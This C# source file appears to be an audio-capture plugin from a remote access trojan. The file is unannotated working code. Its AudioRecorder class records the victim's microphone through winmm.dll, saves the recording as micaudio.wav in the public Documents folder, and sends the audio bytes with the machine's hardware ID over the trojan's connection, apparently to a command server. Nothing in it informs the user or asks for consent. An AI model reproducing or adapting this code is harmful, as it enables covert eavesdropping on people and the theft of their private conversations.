using MessagePackLib.MessagePack;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Plugin
{
    public class AudioRecorder
    {
        private readonly string AudioPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments) + @"\micaudio.wav";
        
        [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern int Record(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);
                
        public void StartAR()
        {
            Record("open new Type waveaudio Alias recsound", "", 0, 0);
            Record("record recsound", "", 0, 0);
        }

        public void SaveAR()
        {
            Record("save recsound " + AudioPath, "", 0, 0);
            Record("close recsound", "", 0, 0);
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Audio";
            msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
            msgpack.ForcePathObject("WavFile").SetAsBytes(File.ReadAllBytes(AudioPath));
            Connection.Send(msgpack.Encode2Bytes());
        }

    }
}

